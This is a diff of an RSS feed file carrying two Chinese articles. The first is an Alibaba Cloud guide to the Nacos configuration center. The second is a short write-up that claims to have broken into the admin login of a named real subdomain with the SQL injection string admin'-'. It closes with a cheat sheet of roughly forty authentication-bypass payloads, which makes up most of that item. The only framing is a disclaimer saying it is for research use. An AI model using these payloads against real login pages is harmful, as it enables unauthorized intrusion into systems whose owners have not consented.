-        file-extension: yml
-        refresh-enabled: true
-        accessKey: xxx
-        secretKey: xxx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p data-pid=&quot;fNdeabkl&quot;&gt;在配置中心对应命名空间下创建 dataId=nacos-config-demo.yml,group=group-demo 的配置&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;602&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;602&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;MiiQxq8j&quot;&gt;使用 @Value 注解引用 nacos 中的参数值，当 nacos 中配置值发生变化时，value 的值会自动更新。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;@Configuration
-@RefreshScope
-public class ConfigBean {
-    
-    @Value(&quot;${cache.useLocalCache:false}&quot;)
-    private boolean useLocalCache;
-    
-    public boolean isUseLocalCache() {
-        return useLocalCache;
-    }
-}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p data-pid=&quot;ZlNL0rZR&quot;&gt;通过 Value 注解可以实现属性值的自动更新，如果希望在配置内容变更时触发回调方法执行。在SpringCloud也可以通过NacosConfigManager#getConfigService获取 springboot 内置的 NacosConfigService 进行基础 API 操作。&lt;/p&gt;&lt;p data-pid=&quot;38FOT7CC&quot;&gt;更多的接入指引可参照官方文档：&lt;/p&gt;&lt;h3&gt;4.日志自助排查&lt;/h3&gt;&lt;p data-pid=&quot;1-xFSMPY&quot;&gt;以上介绍两种比较典型的 nacos 配置中心的接入方式，在日常使用过程中，nacos-client 本地的日志是非常有助于提高问题排查效率。&lt;/p&gt;&lt;p data-pid=&quot;BL9JxyfJ&quot;&gt;nacos 在发布配置，监听配置及变更推送时都会在 {user.home}/logs/nacos/config.log 中打印详细的事件日志。以下是客户端运行期打印的几个关键日志：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;185&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;185&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;LVwMu7FZ&quot;&gt;add-listener:   添加监听，只有添加了对配置的监听，才能收到配置变更推送&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;1FAIEXdT&quot;&gt;server-push：客户端已经收到某个配置的变更通知&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;adL4zQRr&quot;&gt;data-received：收到变更通知后，客户端向服务端查询到了最新的配置内容&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;VD6G53O1&quot;&gt;notify-listener: nacos回调了的监听器Listener，可以看到回调的配置内容MD5。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;QpIPl9GU&quot;&gt;notify-ok:  回调执行正常，可以查看执行回调的具体监听器 Listener，执行耗时。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;vdQIvza0&quot;&gt;notify-error:监听器执行失败，对业务来说可能业务不符合预期，需要根据异常排查原因。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p data-pid=&quot;Z73qaQyA&quot;&gt;如果有 notify-listener 日志，但是没有 notify-ok 日志，则可能是监听器执行堵塞。如果想确认回调线程是否阻塞，可以通过 jstack 命令查看线程堆栈，jstack {pid} | grep -20 &#x27;nacos&#x27; ，通过堆栈判断导致线程堵塞的原因，对应解决即可。&lt;/p&gt;&lt;h3&gt;5.使用须知&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;476&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;476&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;46a3qAgJ&quot;&gt;配置中心的主要作用是发布 meta-data，而不是数据的存储服务。我们对所发布的单个配置数据内容大小 100k 以内。&lt;/p&gt;&lt;p data-pid=&quot;oxrxRASZ&quot;&gt; nacos 是个配置管理系统，不是流量链路产品，配置变更需小于 1 次/分钟。&lt;/p&gt;&lt;p data-pid=&quot;HD3PiLwJ&quot;&gt;nacos 与 redis 等缓存产品有着本质上区别，所以请不要在流量链路内查询配置，正常情况下应用启动时查询一次配置进行业务初始化，后续只需监听配置变化即可。&lt;/p&gt;&lt;p data-pid=&quot;qAgsPs5c&quot;&gt;nacos 只保证最后一次推送的值一定会到达，不保证中间的每一次变更都会送达订阅端。配置在发布成功后并不是实时推送到客户端，中间有一定的时延。&lt;/p&gt;&lt;p data-pid=&quot;4on7SeRc&quot;&gt;nacos 可能在网络状况欠佳时会向订阅者发送重复的数据通知，订阅者对数据通知的处理应满足幂等性，支持重复推送，相同配置回调多次不应产生异常预期外的情况。&lt;/p&gt;&lt;p data-pid=&quot;TwCyK2NB&quot;&gt;在回调监听器中，处理逻辑应尽量轻量化，高耗时操作容易堵塞回调线程，影响其他配置的推送。对于重回调的场景，可以自定义业务线程池异步化处理。&lt;/p&gt;&lt;p data-pid=&quot;AyYUPb6k&quot;&gt;错用场景：&lt;/p&gt;&lt;ul&gt;&lt;li data-pid=&quot;-li7iWgK&quot;&gt;配置超过 1M，频繁变更导致配置中心数据库可用性下降&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;xIYTPe9P&quot;&gt;配置频繁变更，导致对客户端造成推送风暴，造成客户端应用 cpu,gc 压力。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;r2vY7zTm&quot;&gt;客户端在流量链路中调用 getConfig 方法查询配置，业务请求上涨时，配置中心服务端压力上涨，可用性下降&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;oBs-eIek&quot;&gt;回调方法中处理远程 RPC，IO 操作，锁等待等造成回调方法执行堵塞，进而堵塞其他配置变更推送，影响业务&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;配置中心高可用&lt;/h2&gt;&lt;h3&gt;1.客户端容灾&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;283&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;283&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h3&gt;容灾目录&lt;/h3&gt;&lt;p data-pid=&quot;EPOa43cR&quot;&gt;当服务端不可用时且短时无法恢复时，用户可以在本地的容灾目录中手动更新配置内容，以达到模拟服务端配置发生变更的场景。容灾目录中的配置内容具有最高优先级，配置的查询&amp;amp;监听逻辑都将返回容灾配置内容，因此当远程 nacos 服务端恢复正常时，需要将容灾目录中的内容发布到远端，然后删除本地容灾目录。&lt;/p&gt;&lt;p data-pid=&quot;iuMiuv_1&quot;&gt;容灾目录地址：&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;3mREIZPv&quot;&gt;public 命名空间：{user.home}/nacos/config/{servername}_nacos/data/config-data&lt;/li&gt;&lt;li data-pid=&quot;RHLtpD9b&quot;&gt;非 public 命名空间：{user.home}/nacos/config/{servername}_nacos/data/config-data-tenant&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h3&gt;本地缓存&lt;/h3&gt;&lt;p data-pid=&quot;5lw_PgYq&quot;&gt;nacos向服务端查询一次配置内容时，会将内容同步到本地磁盘，当下一次访问服务端接口失败时，会读取本地配置内容，以最大程度保证客户端可用。&lt;/p&gt;&lt;p data-pid=&quot;4wooZART&quot;&gt;缓存目录地址：&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;9_nohuEn&quot;&gt;public 命名空间：{user.home}/nacos/config/{servername}_nacos/snapshot&lt;/li&gt;&lt;li data-pid=&quot;SOwR34Y1&quot;&gt;非 public 命名空间：{user.home}/nacos/config/{servername}_nacos/snapshot-tenant&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h3&gt;2.服务端反脆弱&lt;/h3&gt;&lt;p data-pid=&quot;OSvY1435&quot;&gt;在上一章节中的使用须知里，我们分享了使用 nacos 配置中心的一些使用限制及误用场景，而当客户端错用已经发生时，服务端的反脆弱机制保证了客户端的错用不会影响服务端的可用性。&lt;/p&gt;&lt;p data-pid=&quot;UXXwWlHf&quot;&gt;服务端的反脆弱机制包括连接限流，频繁变更限流，配置发布流量限流等机制来保证可用性。&lt;/p&gt;&lt;i&gt;&lt;b&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;693&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;693&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/b&gt;&lt;/i&gt;&lt;h2&gt;商业化 MSE 优势&lt;/h2&gt;&lt;p data-pid=&quot;wN2kl3MB&quot;&gt;微服务引擎 MSE 是一个面向业界主流开源微服务框架 SpringCloud、Dubbo 以及多语言等一站式微服务平台，支持服务网格生态，标准、灵活、精准的控制流量，帮助提升系统整体的可用性，并且 MSE 在高可用、性能、安全方面大量增强，让您的应用获得企业级的保障。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;hDFn2W2i&quot;&gt;MSE Nacos 和自建 Nacos 对比&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h3&gt;迁移指引&lt;/h3&gt;&lt;h2&gt;Nacos 3.0&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;660&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;660&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;dXB-Gj6k&quot;&gt;Nacos3.0 中，在 SDK 能力提升，界面交互升级，服务端核心能力，可观测可运维，稳定性&amp;amp;高可用方面都规划了诸多功能，除了基础通用的产品能力外，其中配置中心规划了社区呼声较高的模糊订阅功能，也将基于长连接的一致性协议进行升级，提升当前版本在边界异常场景下的稳定性及可靠性，欢迎对 Nacos 感兴趣的社区开发者参与其中。&lt;/p&gt;&lt;p data-pid=&quot;uF0Swcwg&quot;&gt;&lt;i&gt;作者：翼严&lt;/i&gt;&lt;/p&gt;&lt;p data-pid=&quot;nrUspCpO&quot;&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//click.aliyun.com/m/1000368095/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;原文链接&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p data-pid=&quot;gyqPmdiG&quot;&gt;&lt;b&gt;本文为阿里云原创内容，未经允许不得转载。&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
-</item>
-<item>
-<guid>acfe24133a1ed79c9023505ab3b0568e</guid>
-<title>使用 SQL 注入绕过身份验证</title>
-<link>https://toutiao.io/k/gh9wc5w</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content js_underline_content             autoTypeSetting24psection&amp;#10;            &quot; id=&quot;js_content&quot;&gt;&lt;p&gt;使用SQL注入绕过身份验证&lt;/p&gt;&lt;p&gt;声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。&lt;/p&gt;&lt;h2&gt;&lt;span&gt;正文&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p&gt;这里主要记录一下sqli一些笔记:&lt;/p&gt;&lt;p&gt;首先发现了一个子域:&lt;code&gt;https://dealeremail.autotrader.co.uk/&lt;/code&gt;, 有个登陆页面,如下:&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.26215993404781535&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGxtfhiavhZADTy6gSNayO5lY8ItebGvAShA8oEdCQtgfPgbnCjW02K0w/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2426&quot;/&gt;&lt;/figure&gt;&lt;p&gt;用不同的用户名和密码多次登录,但都没有成功,在对 SQLi 进行测试后，在用户名字段中输入了 1”，并发生了类似下面这样的错误:&lt;/p&gt;&lt;p&gt;SELECT * FROM adm where the Error was Long and had the SQL Query that the login page function was using&lt;/p&gt;&lt;p&gt;在用户名和密码字段中使用了最常见的注入字符串,而后进入了管理员面板，使用字符串&lt;code&gt;admin&#x27;-&#x27;&lt;/code&gt; 作为用户名,同样的&lt;code&gt;admin&#x27;-&#x27; &lt;/code&gt;也作为密码。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5886654478976234&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGJsOwA3JX3ZmH1LwX20qReeNON2v9E9yftAgx3NRAFqcTkHTtDdIJrg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2188&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3835616438356164&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGKmloy3ibYqcJFhEnSic2gnmoBCykyHRBqNGXaOH1ZpK1BpDiaDsMEN8cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2336&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGOSAFPFy3FHSpBIwAcJn32HTicbtkH9WlQU6pTYPqjTVqMcwicOOoiaHiaA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2048&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.522508038585209&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGUagogqicEGEAdmwu3QQXaaRy31hbF1y7toxcrMzjGcau7KTpjrPdVgw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2488&quot;/&gt;&lt;/figure&gt;&lt;p&gt;以上就是poc,但是添加了一些常见的一些字符串&lt;/p&gt;&lt;p&gt;最后分享一下SQLi认证绕过常用备忘单&lt;/p&gt;&lt;pre&gt;&lt;code&gt;or 1=1&lt;br/&gt;or 1=1–&lt;br/&gt;or 1=1#&lt;br/&gt;or 1=1/*&lt;br/&gt;admin” or “1”=”1″–&lt;br/&gt;admin” or “1”=”1″#&lt;br/&gt;admin” or “1”=”1″/*&lt;br/&gt;admin”or 1=1 or “”=”&lt;br/&gt;admin” or 1=1&lt;br/&gt;admin” or 1=1–&lt;br/&gt;admin” or 1=1#&lt;br/&gt;admin” or 1=1/*&lt;br/&gt;admin”) or (“1″=”1&lt;br/&gt;admin”) or (“1″=”1”–&lt;br/&gt;admin”) or (“1″=”1″#&lt;br/&gt;admin”) or (“1″=”1″/*&lt;br/&gt;admin”) or “1”=”1&lt;br/&gt;admin”) or “1”=”1″–&lt;br/&gt;admin”) or “1”=”1″#&lt;br/&gt;admin”) or “1”=”1″/*&lt;br/&gt;admin’ —&lt;br/&gt;admin’ #&lt;br/&gt;admin’/*&lt;br/&gt;admin’ or ‘1’=’1&lt;br/&gt;admin’ or ‘1’=’1′–&lt;br/&gt;admin’ or ‘1’=’1’#&lt;br/&gt;admin’ or ‘1’=’1’/*&lt;br/&gt;admin’or 1=1 or ”=’&lt;br/&gt;admin’ or 1=1&lt;br/&gt;admin’ or 1=1–&lt;br/&gt;admin’ or 1=1#&lt;br/&gt;admin’ or 1=1/*&lt;br/&gt;admin’) or (‘1’=’1&lt;br/&gt;admin’) or (‘1’=’1’–&lt;br/&gt;admin’) or (‘1’=’1’#&lt;br/&gt;admin’) or (‘1’=’1’/*&lt;br/&gt;admin’) or ‘1’=’1&lt;br/&gt;admin’) or ‘1’=’1′–&lt;br/&gt;admin’) or ‘1’=’1’#&lt;br/&gt;admin’) or ‘1’=’1’/*&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;mp-style-type data-value=&quot;3&quot;/&gt;&lt;/p&gt;&lt;/div&gt;
-
-          
-        &lt;/div&gt;&lt;/div&gt;</content:encoded>
+  &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 </channel></rss>
